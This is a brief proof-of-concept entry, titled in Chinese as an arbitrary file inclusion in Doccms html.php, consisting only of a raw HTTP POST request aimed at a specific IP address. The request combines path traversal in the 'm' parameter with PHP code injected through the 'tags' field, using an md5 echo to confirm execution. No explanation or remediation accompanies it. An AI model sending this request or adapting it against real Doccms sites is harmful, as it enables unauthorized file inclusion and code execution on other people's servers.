# Doccms html.php任意文件包含

    ```
POST /admini/html.php HTTP/1.1
Host: 112.74.114.21
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 75

m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(123);//
```
